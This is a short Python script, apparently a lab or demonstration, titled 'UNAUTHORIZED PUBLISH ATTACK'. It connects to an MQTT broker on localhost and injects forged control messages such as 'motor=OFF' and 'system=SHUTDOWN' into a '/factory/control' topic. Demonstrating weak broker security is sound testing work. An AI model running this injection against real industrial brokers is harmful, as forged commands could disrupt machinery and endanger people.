import time
import paho.mqtt.client as mqtt


BROKER = "localhost"
PORT = 1883

TARGET_TOPIC = "/factory/control"


def main():

    print("=" * 60)
    print("       UNAUTHORIZED PUBLISH ATTACK")
    print("=" * 60)

    print()
    print("Connecting to MQTT broker...")

    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2
    )

    client.connect(
        BROKER,
        PORT,
        60
    )

    client.loop_start()

    print("Connected successfully.")
    print()

    print("Attempting unauthorized publish...")
    print()

    unauthorized_messages = [
        "temperature=99",
        "temperature=100",
        "motor=OFF",
        "pressure=999",
        "system=SHUTDOWN"
    ]

    for message in unauthorized_messages:

        client.publish(
            TARGET_TOPIC,
            message
        )

        print(
            f"Unauthorized publish: {message}"
        )

        time.sleep(0.5)

    client.loop_stop()
    client.disconnect()

    print()
    print("=" * 60)
    print("Unauthorized publish simulation completed.")
    print("=" * 60)


if __name__ == "__main__":
    main()